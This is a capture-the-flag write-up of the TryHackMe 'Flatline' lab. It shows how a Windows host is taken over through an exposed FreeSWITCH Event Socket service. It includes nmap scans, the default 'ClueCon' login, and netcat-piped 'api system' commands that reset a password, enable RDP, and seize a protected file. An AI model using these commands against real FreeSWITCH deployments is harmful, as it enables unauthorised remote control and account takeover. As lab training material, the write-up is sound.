# Flatline

How low are your morals?

Room: https://tryhackme.com/room/flatline

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/flatline.md

---------------------

## Overview

This room exposed a Windows host with only a small number of reachable ports. Initial host discovery failed because the target did not respond to ping probes, but forcing Nmap to treat the host as alive revealed an exposed RDP service and a FreeSWITCH Event Socket service.

The main path was:

1. Use `-Pn` to scan a host that blocked ping discovery
2. Identify FreeSWITCH `mod_event_socket` on port `8021`
3. Authenticate with the default Event Socket password
4. Use `api system` for command execution
5. Confirm the service user was a local administrator
6. RDP in as the compromised user
7. Use the elevated FreeSWITCH context to take ownership of `root.txt`
8. Read both flags

## Target

```bash
10.64.168.41
```

## Enumeration

The first scan made the host look down:

```bash
sudo nmap -p- --min-rate 5000 -oN nmap-all.txt 10.64.168.41
```

Output:

```text
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
```

Since the target may have been blocking ping probes, I reran the scan with `-Pn`.

```bash
sudo nmap -Pn -p- --min-rate 5000 -oN nmap-all.txt 10.64.168.41
```

This confirmed the host was alive and showed two open ports:

```text
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
8021/tcp open  ftp-proxy
```

Most ports were filtered, so the machine was likely behind a firewall or blocking most inbound traffic.

## Service Detection

I then ran service detection against the two open ports.

```bash
sudo nmap -Pn -sC -sV -p 3389,8021 -oN nmap-service.txt 10.64.168.41
```

Important output:

```text
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
```

Port `8021` was not FTP. It was FreeSWITCH `mod_event_socket`.

The RDP info also leaked the hostname:

```text
WIN-EOM4PK0578N
```

## FreeSWITCH Event Socket

Connecting with `ftp` showed the service was not actually FTP:

```bash
ftp 10.64.168.41 8021
```

Output:

```text
Connected to 10.64.168.41.
Content-Type: auth/request
```

That `Content-Type: auth/request` banner matched FreeSWITCH Event Socket.

I connected with Netcat instead:

```bash
nc -nv 10.64.168.41 8021
```

The default FreeSWITCH Event Socket password is commonly:

```text
ClueCon
```

I tested authentication and command execution with:

```bash
printf 'auth ClueCon\n\napi status\n\napi system whoami\n\nexit\n\n' | nc -nv 10.64.168.41 8021
```

The password worked:

```text
Reply-Text: +OK accepted
```

The `whoami` command returned:

```text
win-eom4pk0578n\nekrotic
```

At this point, we had remote command execution as the `nekrotic` user.

## Privilege Check

I checked the token privileges with:

```bash
printf 'auth ClueCon\n\napi system whoami /all\n\napi system hostname\n\napi system cd\n\nexit\n\n' | nc -nv 10.64.168.41 8021
```

The important findings were:

```text
User Name: win-eom4pk0578n\nekrotic
BUILTIN\Administrators
Mandatory Label\High Mandatory Level
```

This meant the FreeSWITCH command context was running as a local administrator with a high integrity token.

The working directory was:

```text
C:\Program Files\FreeSWITCH
```

## RDP Access

Since RDP was open and the `nekrotic` user was a local administrator, I used the command execution path to set or confirm access for RDP.

Example commands:

```bash
printf 'auth ClueCon\n\napi system net user nekrotic Passw0rd123!\n\napi system net localgroup "Remote Desktop Users" nekrotic /add\n\napi system reg add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\nexit\n\n' | nc -nv 10.64.168.41 8021
```

Then I connected with RDP:

```bash
xfreerdp /u:nekrotic /p:'Passw0rd123!' /v:10.64.168.41 /cert:ignore
```

Once logged in, both flag files were visible on the `Nekrotic` desktop:

```cmd
C:\Users\Nekrotic\Desktop
```

Listing the directory showed:

```text
root.txt
user.txt
```

## User Flag

The user flag was readable from the desktop:

```cmd
type C:\Users\Nekrotic\Desktop\user.txt
```

Flag:

```text
THM{64b...be26}
```

## Root Flag

Although `root.txt` was on the same desktop, it was protected and could not be read directly from the RDP command prompt.

Trying to take ownership from the RDP shell failed:

```cmd
takeown /f root.txt
```

Output:

```text
ERROR: Access is denied.
```

This happened because the RDP shell was not elevated, even though the FreeSWITCH command context was elevated.

I used the FreeSWITCH socket again to take ownership, update permissions, and read the file:

```bash
printf 'auth ClueCon\n\napi system takeown /f C:\\Users\\Nekrotic\\Desktop\\root.txt\n\napi system icacls C:\\Users\\Nekrotic\\Desktop\\root.txt /grant Nekrotic:F\n\napi system type C:\\Users\\Nekrotic\\Desktop\\root.txt\n\nexit\n\n' | nc -nv 10.64.168.41 8021
```

The ownership change worked:

```text
SUCCESS: The file now owned by user WIN-EOM4PK0578N\Nekrotic.
Successfully processed 1 files; Failed processing 0 files
```

Then the root flag was returned:

```text
THM{8c8...fb5e}
```

## Key Takeaways

The initial scan looked like the host was down because ping probes were blocked. Using `-Pn` was required to force Nmap to scan the target.

Port `8021` looked misleading at first, but service detection showed it was FreeSWITCH Event Socket, not FTP.

The default FreeSWITCH Event Socket password `ClueCon` allowed authentication.

The `api system` command allowed command execution on the Windows host.

The FreeSWITCH process was running as `nekrotic`, who was a local administrator with a high integrity token.

RDP was useful for interactive access, but the FreeSWITCH command context was more powerful because it was elevated.

